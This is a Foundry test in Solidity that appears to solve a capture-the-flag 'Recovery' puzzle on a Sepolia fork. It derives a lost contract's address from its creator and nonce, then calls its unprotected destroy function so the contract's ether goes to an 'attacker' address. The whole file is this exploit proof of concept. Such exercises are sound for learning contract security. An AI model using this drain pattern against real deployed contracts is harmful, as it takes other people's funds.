// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

interface ISimpleToken{
    function destroy(address payable _to) external;
}

contract TestRecovery is Test {
    address public constant RECOVERY_ADDRESS = 0x65637772Db8FE6129358ea3D4Ef4Cb343ACB435E;
    uint256 public constant INITIAL_BALANCE = 0.001 ether; 
    uint256 public constant NOUNCE = 1;
    address attacker;
    ISimpleToken target;
    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);
        attacker = makeAddr("attacker");
    }   

    function testRecovery() public {
        // find lost contract address
        address lostContractAddress = vm.computeCreateAddress(RECOVERY_ADDRESS, NOUNCE);
        console.log(lostContractAddress);

        // build target (lost contract address)
        target = ISimpleToken(lostContractAddress);

        // check intial balance
        assertEq(address(target).balance , INITIAL_BALANCE);
    
        // to tranfet all the fund to attacker wallet address;
        vm.prank(attacker);
        target.destroy(payable(attacker));

        // balance of contract should be zero
        assertEq(address(target).balance , 0);
        
        // balance of attacker should be 0.001 ether (INITIAL_BALANCE)
        assertEq(attacker.balance , INITIAL_BALANCE); 
    }

}